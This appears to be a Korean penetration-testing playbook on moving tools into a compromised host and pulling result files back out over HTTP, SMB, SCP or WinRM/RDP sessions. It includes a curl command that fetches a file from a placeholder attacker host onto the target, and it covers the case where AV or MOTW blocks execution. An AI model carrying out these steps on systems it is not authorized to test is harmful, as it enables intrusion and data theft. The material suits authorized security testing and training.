# 상황별 파일 전송

## 플레이북 개요

대상에서 명령을 실행할 수 있고 파일을 저장할 경로가 있다면, 대상 운영체제와 실제 통신 가능한 프로토콜에 맞춰 파일을 반입하거나 회수한다. 인코딩 손상이나 정확한 사본 여부가 판단을 바꾸는 경우에만 양쪽 hash를 비교한다.

셸을 확보한 뒤 열거 도구·payload·결과 파일을 옮겨야 하고, HTTP·SMB·SSH·WinRM·RDP 중 실제로 연결 가능한 경로를 선택해야 할 때 사용한다. 바이너리 손상이나 인코딩 문제가 의심되면 선택 비교를 추가한다.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 실행 환경 | `uname`, `whoami`, PowerShell 여부 | OS/arch/권한 파악 |
| 네트워크 경로 | `curl`, `wget`, SMB 또는 SSH로 실제 연결 | 파일을 보내는 쪽에서 받는 쪽의 서비스 포트에 연결 가능 |
| 저장 경로 | `/tmp`, `%TEMP%`, writable dir | 파일 생성 가능 |

## 실행

현재 경로와 대상 쓰기 가능 경로를 확인한 뒤, Linux HTTP 반입을 선택했다면 다음 명령으로 시작하고 listener 준비·실패 분기·복구는 [[Linux HTTP 파일 반입]]에서 이어간다. `<DESTINATION_FILE>`은 Linux 대상 호스트의 작업 전 존재하지 않는 절대 파일 경로(가상 예: `/tmp/enum.sh`)이고, `<ATTACKER_IP>`·`<HTTP_PORT>`는 제공 listener의 IP·TCP 포트, `<SOURCE_FILE>`은 제공 디렉터리의 파일명이다.

```bash
test ! -e '<DESTINATION_FILE>'
curl -f -o '<DESTINATION_FILE>' http://<ATTACKER_IP>:<HTTP_PORT>/<SOURCE_FILE>
```

`test`가 실패하면 기존 파일을 덮어쓰지 않고 새 `<DESTINATION_FILE>`을 정한다.

Windows에서는 대상의 실제 저장 경로와 사용할 클라이언트에 맞는 [[Certutil로 Windows HTTP 파일 반입]] 또는 [[SMB 공유로 Windows 파일 반입]]을 선택한다. 이 문서는 경로 선택과 완료 기준을 설명하며, 각 전송 기법의 세부 명령은 연결한 문서에서 실행한다.

| 관찰한 조건 | 선택 경로 | 연결할 기법·도구 | 완료 기준 |
|---|---|---|---|
| Linux 대상이 공격 호스트의 HTTP listener에 접근 가능 | HTTP 다운로드 | [[Linux HTTP 파일 반입]] | 대상 파일 생성과 요청 로그 확인 |
| Windows 대상에서 읽을 수 있는 파일을 공격 호스트로 회수해야 함 | HTTP POST 파일 회수 | [[Windows HTTP 파일 회수]] | 공격 호스트의 수신 파일과 요청 로그 확인 |
| Linux 대상에서 읽을 수 있는 파일을 공격 호스트로 회수해야 함 | HTTP(S) multipart 파일 회수 | [[Linux HTTP 파일 회수]] | 공격 호스트의 수신 파일과 요청 로그 확인 |
| Windows 대상에서 공격 호스트의 SMB 445/TCP에 연결 가능 | SMB 공유에서 파일 반입 | [[SMB 공유로 Windows 파일 반입]] | 대상 파일 생성과 SMB 요청 확인 |
| 유효한 SSH 계정과 쓰기 경로가 있음 | SCP | [[SCP 파일 반입과 회수]] | 원격 파일 생성과 protocol 성공 확인 |
| WinRM·RDP 세션만 있음 | 세션의 upload·drive 기능 | [[evil-winrm]], [[xfreerdp]] | 세션 경유 저장 결과 확인 |
| 표준 클라이언트가 없지만 대상이 공격 호스트의 HTTP 포트에 연결할 수 있거나 문자열을 전달할 수 있음 | 운영체제 내장 기능·인코딩을 이용한 반입 | [[제한 환경 파일 반입]] | 복원 파일 생성; 변형 경로면 hash 비교 |
| 평문 전송 경로만 사용할 수 있고 파일 자체를 먼저 보호해야 함 | 전송용 사본 암호화 후 선택한 경로로 전송 | [[openssl]] | 복호화 왕복 결과와 원본 SHA-256 일치 |
| 전송은 됐지만 실행이 막힘 | 실행 조건 재평가 | 운영체제별 권한·정책 확인 | 실행 bit·ACL·MOTW·AV 상태 확인 |

1. 현재 OS·arch·identity와 writable 경로를 확인한다.
2. 가장 단순한 단일 경로를 선택하고 listener와 protocol을 맞춘다.
3. 인코딩 손상 또는 정확한 사본 여부가 필요한 경우에만 송신 전후 크기와 hash를 비교한다.
4. 반입 성공, 실행 가능 여부와 회수 성공을 서로 다른 결과 상태로 구분한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 파일이 선택한 정확한 경로에 생성되고 protocol·요청 로그가 성공함 | 선택한 경로의 전송이 완료됨 | 파일 반입 | 실행 조건을 별도 확인 |
| 회수 파일이 선택한 정확한 경로에 저장되고 protocol·요청 로그가 성공함 | 결과 파일 회수 완료 | 파일 회수 | 필요한 분석만 수행 |
| 수신 서비스에는 요청이 없고 TCP 연결도 실패함 | 선택한 프로토콜, 주소, 포트 또는 통신 방향이 맞지 않음 | 전송 경로 미확보 | 연결 가능한 다른 프로토콜을 고르고 파일 반입이면 [[제한 환경 파일 반입]] 검토 |
| 파일 크기 또는 hash가 다름 | 텍스트 모드, 인코딩, header 또는 중단 전송 문제 | 손상된 파일 | 실행하지 말고 binary-safe 방식으로 재전송 |
| 선택한 hash는 맞지만 실행이 거부됨 | ACL, 실행 bit, MOTW, 정책 또는 AV 문제 | 파일 반입만 완료 | 실행 권한과 차단 정책을 별도 기법으로 판단 |
| 파일을 읽을 수 없거나 저장할 수 없음 | 현재 세션의 파일 권한 문제 | 네트워크 경로만 확보 | writable·readable 경로와 현재 identity 재확인 |

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| 현재 상태 | 운영체제·CPU 아키텍처, `whoami`·`id`, 저장 경로 ACL | 실행 가능한 전송 도구와 현재 계정이 파일을 쓸 수 있는 경로 확인 |
| listener·protocol | 요청 로그, SMB·SSH·WinRM·RDP 연결 성공 | 네트워크 경로와 파일 권한을 구분 |
| 선택 비교 | 원본·수신본 크기와 SHA-256 | 인코딩 손상 또는 정확한 사본 여부가 판단을 바꿀 때만 대조 |
| 실행·회수 | 실행 권한·정책, 회수 파일 경로와 protocol 성공 | 반입, 실행, 회수를 독립 상태로 확정 |

## 변경 영향과 복구

이 오케스트레이터가 직접 만드는 항목은 위 HTTP 예시의 `<DESTINATION_FILE>`이다. 선택한 다른 전송 방식의 listener·cache·수신 파일은 연결된 기법 문서의 복구 절차를 따른다.

1. 대상 호스트에서 실행 중인 반입 파일이라면 해당 PID와 하위 작업을 먼저 정상 종료한다.
2. 작업 전 존재하지 않았고 이번 전송으로 생성한 exact 경로인지 `ls -l '<DESTINATION_FILE>'`과 전송에 사용한 경로·요청 로그로 대조한다. 변형·손상 진단을 수행했다면 그때만 기록한 SHA-256도 대조한다.
3. 더 이상 필요하지 않을 때만 대상 호스트에서 `rm -- '<DESTINATION_FILE>'`을 실행하고 `test ! -e '<DESTINATION_FILE>'`로 확인한다.
4. HTTP·SMB·SSH 등 선택한 listener와 회수본은 해당 연결 문서에서 PID·job ID·수신 경로별로 정리한다. listener가 먼저 끊기면 원격 파일을 확인할 수 없는 흐름에서는 원격 정리를 먼저 수행한다.

기존 파일을 덮어썼거나 원래 값이 없으면 이 절차만으로 복원할 수 없다. 파일 이름만으로 같은 이름의 다른 process나 파일을 일괄 삭제하지 않고 복구 제한으로 기록한다.
